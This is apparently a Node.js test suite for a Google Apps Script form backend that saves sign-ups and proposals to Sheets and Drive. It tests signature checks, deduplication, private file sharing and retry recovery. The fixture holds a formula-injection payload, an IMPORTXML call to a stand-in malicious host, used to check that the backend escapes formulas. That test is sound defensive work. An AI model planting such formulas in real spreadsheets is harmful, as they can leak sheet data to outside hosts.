import test from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { createContext, runInContext } from "node:vm";
import { createHmac } from "node:crypto";
import { Buffer } from "node:buffer";

const source = readFileSync(new URL("../google-apps-script/Code.gs", import.meta.url), "utf8");
const secret = "a".repeat(64);
const id = "12345678-1234-4123-8123-123456789abc";
const otherId = "12345678-1234-4123-8123-123456789abd";

function fixture() {
  const state = { sheets: new Map(), files: new Map(), opens: 0, failWrite: false, failFlush: false, creates: 0,
    account: "oficial@llasantafe.com.ar", privateResources: [], failDetails: false, failDescription: false,
    properties: { API_SECRET: secret, SPREADSHEET_ID: "private-sheet", UPLOAD_FOLDER_ID: "private-folder" } };
  function sheet(headers) {
    const rows = headers ? [headers] : [], model = { rows, maxRows: 2,
      setName(name) {
        for (const [key, value] of state.sheets) if (value === model) state.sheets.delete(key);
        state.sheets.set(name, model);
      },
      setFrozenRows() {},
      getLastRow: () => rows.length, getMaxRows: () => model.maxRows,
      insertRowsAfter: (_, count) => { model.maxRows += count; },
      getRange(row, column, height = 1, width = 1) {
        return {
          getRow: () => row,
          getValues: () => Array.from({ length: height }, (_, i) =>
            Array.from({ length: width }, (_, j) => rows[row - 1 + i]?.[column - 1 + j] ?? "")),
          getDisplayValues: () => Array.from({ length: height }, (_, i) =>
            Array.from({ length: width }, (_, j) => String(rows[row - 1 + i]?.[column - 1 + j] ?? "").replace(/^'/, ""))),
          getValue: () => rows[row - 1]?.[column - 1] ?? "",
          setValues(values) {
            if (row > model.maxRows) throw new Error("grid limit");
            if (state.failWrite) { state.failWrite = false; throw new Error("write failure"); }
            values.forEach((valuesRow, i) => { rows[row - 1 + i] = [...valuesRow]; });
          },
          createTextFinder(value) {
            return { matchEntireCell() { return this; }, findNext() {
              for (let i = row - 1; i < row - 1 + height; i++) {
                if (rows[i]?.[column - 1] === value) return model.getRange(i + 1, column);
              }
              return null;
            } };
          },
        };
      },
    };
    return model;
  }
  const folder = {
    getId: () => "private-folder",
    setSharing(access, permission) {
      assert.equal(access, "PRIVATE"); assert.equal(permission, "NONE");
      state.privateResources.push("folder");
    },
    getFilesByName(name) {
      return { hasNext: () => state.files.has(name), next: () => state.files.get(name) };
    },
    createFile(blob) {
      if (state.failDetails && blob.name.endsWith(".ficha-propuesta.txt")) {
        state.failDetails = false; throw new Error("details creation failure");
      }
      state.creates++;
      const fileId = state.creates === 1 ? "private-file-id" : "private-file-" + state.creates;
      const file = { content: blob.bytes, mime: blob.type, description: "", private: false,
        getName: () => blob.name, getId: () => fileId, getUrl: () => "https://drive.google.com/file/d/" + fileId + "/view",
        setContent(content) { this.content = content; },
        setDescription(description) {
          if (state.failDescription) { state.failDescription = false; throw new Error("description failure"); }
          this.description = description;
        },
        setSharing(access, permission) {
          assert.equal(access, "PRIVATE"); assert.equal(permission, "NONE"); this.private = true;
        } };
      state.files.set(blob.name, file);
      return file;
    },
  };
  const spreadsheet = {
    getId: () => "private-sheet", getUrl: () => "https://sheets.example/private-sheet",
    getSheets: () => [...state.sheets.values()], getSheetByName: name => state.sheets.get(name),
    setSpreadsheetTimeZone() {},
    insertSheet(name) { const model = sheet(); state.sheets.set(name, model); return model; },
  };
  const context = createContext({
    console: { log() {} }, Date, JSON,
    Session: { getEffectiveUser: () => ({ getEmail: () => state.account }) },
    PropertiesService: { getScriptProperties: () => ({
      getProperty: name => state.properties[name], setProperty: (name, value) => { state.properties[name] = value; },
    }) },
    LockService: { getScriptLock: () => ({ waitLock() {}, tryLock: () => true, hasLock: () => true, releaseLock() {} }) },
    SpreadsheetApp: {
      create: () => { spreadsheet.insertSheet("Sheet1"); return spreadsheet; },
      openById: () => { state.opens++; return spreadsheet; },
      flush: () => { if (state.failFlush) { state.failFlush = false; throw new Error("ambiguous flush failure"); } },
    },
    DriveApp: {
      getFolderById: () => folder, createFolder: () => folder,
      getFileById: fileId => fileId === "private-sheet" ? ({ setSharing(access, permission) {
        assert.equal(access, "PRIVATE"); assert.equal(permission, "NONE");
        state.privateResources.push("sheet");
      } }) : [...state.files.values()].find(file => file.getId() === fileId),
      Access: { PRIVATE: "PRIVATE" }, Permission: { NONE: "NONE" },
    },
    Utilities: {
      Charset: { UTF_8: "UTF-8" },
      computeHmacSha256Signature: (payload, key) => [...createHmac("sha256", key).update(payload).digest()],
      base64Decode: value => [...Buffer.from(value, "base64")],
      newBlob: (bytes, type, name) => ({ bytes, type, name }),
    },
    ContentService: { MimeType: { JSON: "JSON" }, createTextOutput: text => ({ text, setMimeType() { return this; } }) },
  });
  runInContext(source, context);
  const headers = JSON.parse(runInContext("JSON.stringify(HEADERS)", context));
  state.sheets.set("Sumate", sheet(headers.sumate));
  state.sheets.set("Propuestas", sheet(headers.propone));
  function send(submission, change = value => value) {
    const payload = JSON.stringify(submission), timestamp = String(Date.now());
    const signature = createHmac("sha256", secret).update(timestamp + "." + payload).digest("hex");
    return JSON.parse(context.doPost({ postData: { contents: JSON.stringify(change({ payload, timestamp, signature })) } }).text);
  }
  return { state, send, setup: () => context.setupWorkspace(), restore: () => context.restoreExistingProposalDetails() };
}

test("setupWorkspace crea recursos restringidos y encabezados sin duplicarlos ni borrar filas", () => {
  const f = fixture();
  f.state.sheets.clear();
  delete f.state.properties.SPREADSHEET_ID;
  delete f.state.properties.UPLOAD_FOLDER_ID;
  f.setup();
  assert.deepEqual([...f.state.sheets.keys()], ["Sumate", "Propuestas"]);
  assert.equal(f.state.properties.SPREADSHEET_ID, "private-sheet");
  assert.equal(f.state.properties.UPLOAD_FOLDER_ID, "private-folder");
  assert.ok(f.state.privateResources.includes("sheet"));
  assert.ok(f.state.privateResources.includes("folder"));
  assert.equal(f.send(submission()).ok, true);
  f.setup();
  assert.equal(f.state.sheets.get("Sumate").rows.length, 2);
  assert.equal(f.state.sheets.size, 2);
});

test("setupWorkspace exige cuenta oficial, secreto y esquema compatible", () => {
  const f = fixture();
  f.state.account = "otra@example.com";
  assert.throws(f.setup, /oficial@llasantafe/);
  f.state.account = "oficial@llasantafe.com.ar";
  f.state.properties.API_SECRET = "short";
  assert.throws(f.setup, /API_SECRET/);
  f.state.properties.API_SECRET = secret;
  f.state.sheets.get("Sumate").rows[0][0] = "encabezado modificado";
  assert.throws(f.setup, /schema_mismatch/);
});

function submission(kind = "sumate") {
  return {
    schemaVersion: 1, requestId: id, kind, receivedAt: new Date().toISOString(), fingerprint: "b".repeat(64),
    data: kind === "sumate"
      ? { nombre: "Persona de prueba", dni: "01234567", whatsapp: "+54 9 341 1234567", localidad: "Rosario", quiereFiscalizar: false }
      : { nombre: "Persona de prueba", telefono: "+54 9 341 1234567", email: "prueba@example.com", profesion: "otro", motivo: "proyecto", mensaje: '=IMPORTXML("https://malicious.example","//a")' },
    attachment: kind === "sumate" ? null : { name: "prueba.pdf", mimeType: "application/pdf", size: 14, base64: Buffer.from("%PDF-1.7\n%%EOF").toString("base64") },
  };
}

test("Apps Script rechaza firma manipulada y fecha expirada antes de abrir Sheets", () => {
  const f = fixture();
  assert.equal(f.send(submission(), envelope => ({ ...envelope, signature: "c".repeat(64) })).ok, false);
  assert.equal(f.send(submission(), envelope => ({ ...envelope, timestamp: "1000000000000" })).ok, false);
  assert.equal(f.send(submission(), envelope => ({ ...envelope, payload: envelope.payload + " " })).ok, false);
  assert.equal(f.state.opens, 0);
});

test("Apps Script almacena DNI y teléfono como texto y fiscalización como booleano", () => {
  const f = fixture();
  assert.deepEqual(f.send(submission()), { ok: true, id });
  const row = f.state.sheets.get("Sumate").rows[1];
  assert.equal(row[6], "'01234567");
  assert.equal(row[7], "'+54 9 341 1234567");
  assert.equal(row[9], false);
});

test("Apps Script no duplica registros por ID ni por contenido", () => {
  const f = fixture(), value = submission();
  assert.equal(f.send(value).ok, true);
  assert.equal(f.send(value).ok, true);
  assert.deepEqual(f.send({ ...value, requestId: otherId }), { ok: true, id });
  assert.equal(f.send({ ...value, fingerprint: "c".repeat(64) }).ok, false);
  assert.equal(f.state.sheets.get("Sumate").rows.length, 2);
});

test("Apps Script guarda adjunto privado y escapa fórmulas", () => {
  const f = fixture();
  assert.deepEqual(f.send(submission("propone")), { ok: true, id });
  assert.equal(f.state.creates, 2);
  const row = f.state.sheets.get("Propuestas").rows[1];
  assert.ok(row[10].startsWith("'=IMPORTXML"));
  assert.equal(row[11], "private-file-id");
});

test("Apps Script recupera el archivo sin duplicarlo tras un fallo de Sheets", () => {
  const f = fixture(), value = submission("propone");
  f.state.failWrite = true;
  assert.equal(f.send(value).ok, false);
  assert.deepEqual(f.send(value), { ok: true, id });
  assert.equal(f.state.creates, 2);
  assert.equal(f.state.sheets.get("Propuestas").rows.length, 2);
});

test("Apps Script confirma un reintento si Google guardó antes de un timeout", () => {
  const f = fixture(), value = submission();
  f.state.failFlush = true;
  assert.equal(f.send(value).ok, false);
  assert.deepEqual(f.send(value), { ok: true, id });
  assert.equal(f.state.sheets.get("Sumate").rows.length, 2);
});

test("Apps Script amplía las filas al llegar al límite inicial de la hoja", () => {
  const f = fixture(), value = submission();
  assert.equal(f.send(value).ok, true);
  assert.equal(f.send({ ...value, requestId: otherId, fingerprint: "d".repeat(64) }).ok, true);
  assert.equal(f.state.sheets.get("Sumate").rows.length, 3);
});

test("Propone conserva todos los campos en Sheets, ficha privada y descripción del PDF", () => {
  const f = fixture(), value = submission("propone");
  value.data.profesion = "docente";
  value.data.mensaje = "Primera línea con tildes: educación.\nSegunda línea <texto> sin HTML.";
  assert.equal(f.send(value).ok, true);
  const row = f.state.sheets.get("Propuestas").rows[1];
  assert.deepEqual(row.slice(5, 11), [value.data.nombre, "'" + value.data.telefono,
    value.data.email, "docente", "proyecto", value.data.mensaje]);
  const details = f.state.files.get(id + ".ficha-propuesta.txt");
  const pdf = f.state.files.get(id + "_prueba.pdf");
  assert.equal(details.mime, "text/plain");
  assert.equal(details.private, true);
  assert.equal(pdf.private, true);
  assert.deepEqual(pdf.content, [...Buffer.from(value.attachment.base64, "base64")]);
  for (const text of [value.data.nombre, value.data.telefono, value.data.email,
    "Docente / Investigador", "Proyecto / Propuesta formal", value.data.mensaje,
    id, value.receivedAt, pdf.getUrl()]) {
    assert.ok(details.content.includes(text));
    assert.ok(pdf.description.includes(text));
  }
  assert.ok(pdf.description.includes(details.getUrl()));
  assert.equal(f.send(value).ok, true);
  assert.equal(f.send({ ...value, requestId: otherId }).ok, true);
  assert.equal(f.state.creates, 2);
});

test("Propone sin adjunto también genera ficha y conserva el mensaje literal", () => {
  const f = fixture(), value = submission("propone");
  value.attachment = null;
  assert.equal(f.send(value).ok, true);
  const details = f.state.files.get(id + ".ficha-propuesta.txt");
  assert.ok(details.content.includes("Sin documento adjunto."));
  assert.ok(details.content.includes(value.data.mensaje));
  assert.equal(f.state.creates, 1);
  assert.equal(f.state.sheets.get("Propuestas").rows[1][11], "");
});

for (const failure of ["failDetails", "failDescription"]) {
  test("Propone no confirma sin ficha completa y recupera el reintento: " + failure, () => {
    const f = fixture(), value = submission("propone");
    f.state[failure] = true;
    assert.equal(f.send(value).ok, false);
    assert.equal(f.state.sheets.get("Propuestas").rows.length, 1);
    assert.equal(f.send(value).ok, true);
    assert.equal(f.state.creates, 2);
    assert.equal(f.state.sheets.get("Propuestas").rows.length, 2);
  });
}

test("El nombre de un adjunto TXT no puede colisionar con la ficha", () => {
  const f = fixture(), value = submission("propone");
  value.attachment.name = ".ficha-propuesta.txt";
  assert.equal(f.send(value).ok, true);
  assert.equal(f.state.files.size, 2);
  assert.ok(f.state.files.has(id + "_.ficha-propuesta.txt"));
  assert.ok(f.state.files.has(id + ".ficha-propuesta.txt"));
});

test("Recuperación histórica genera fichas desde Sheets sin duplicar ni alterar filas", () => {
  const f = fixture(), value = submission("propone");
  assert.equal(f.send(value).ok, true);
  // Simular una fila anterior a esta mejora, con solo su PDF en Drive.
  f.state.files.delete(id + ".ficha-propuesta.txt");
  const pdf = f.state.files.get(id + "_prueba.pdf");
  pdf.description = "";
  const before = JSON.stringify(f.state.sheets.get("Propuestas").rows);
  f.restore();
  assert.equal(f.state.files.size, 2);
  const details = f.state.files.get(id + ".ficha-propuesta.txt");
  assert.ok(details.content.includes("Teléfono: " + value.data.telefono));
  assert.ok(details.content.includes("MENSAJE\n" + value.data.mensaje));
  assert.ok(pdf.description.includes(value.data.nombre));
  assert.equal(JSON.stringify(f.state.sheets.get("Propuestas").rows), before);
  assert.equal(f.state.properties.PROPOSAL_DETAILS_NEXT_ROW, "3");
  f.restore();
  assert.equal(f.state.files.size, 2);
});

test("Recuperación histórica rechaza otra cuenta y no inventa datos ausentes", () => {
  const f = fixture();
  f.state.account = "otra@example.com";
  assert.throws(f.restore, /oficial@llasantafe/);
  f.state.account = "oficial@llasantafe.com.ar";
  assert.equal(f.send(submission("propone")).ok, true);
  f.state.sheets.get("Propuestas").rows[1][5] = "";
  assert.throws(f.restore, /Faltan datos en la fila 2/);
  assert.equal(f.state.properties.PROPOSAL_DETAILS_NEXT_ROW, undefined);
});

test("Recuperación histórica limita cada lote a 25 filas y continúa desde el cursor", () => {
  const f = fixture(), sheet = f.state.sheets.get("Propuestas");
  const value = submission("propone");
  for (let index = 1; index <= 26; index++) {
    const rowId = "12345678-1234-4123-8123-" + String(index).padStart(12, "0");
    sheet.rows.push([rowId, value.receivedAt, value.fingerprint, 1, "pendiente",
      value.data.nombre, "'" + value.data.telefono, value.data.email,
      value.data.profesion, value.data.motivo, "'" + value.data.mensaje, "", "", "", "", ""]);
  }
  f.restore();
  assert.equal(f.state.files.size, 25);
  assert.equal(f.state.properties.PROPOSAL_DETAILS_NEXT_ROW, "27");
  f.restore();
  assert.equal(f.state.files.size, 26);
  assert.equal(f.state.properties.PROPOSAL_DETAILS_NEXT_ROW, "28");
  f.state.properties.PROPOSAL_DETAILS_NEXT_ROW = "2";
  f.restore();
  assert.equal(f.state.files.size, 26);
});

test("Recuperación histórica conserva la fila pendiente tras un fallo de Drive", () => {
  const f = fixture(), value = submission("propone");
  assert.equal(f.send(value).ok, true);
  f.state.files.delete(id + ".ficha-propuesta.txt");
  f.state.failDetails = true;
  assert.throws(f.restore, /details creation failure/);
  assert.equal(f.state.properties.PROPOSAL_DETAILS_NEXT_ROW, undefined);
  f.restore();
  assert.equal(f.state.files.size, 2);
  assert.equal(f.state.properties.PROPOSAL_DETAILS_NEXT_ROW, "3");
});
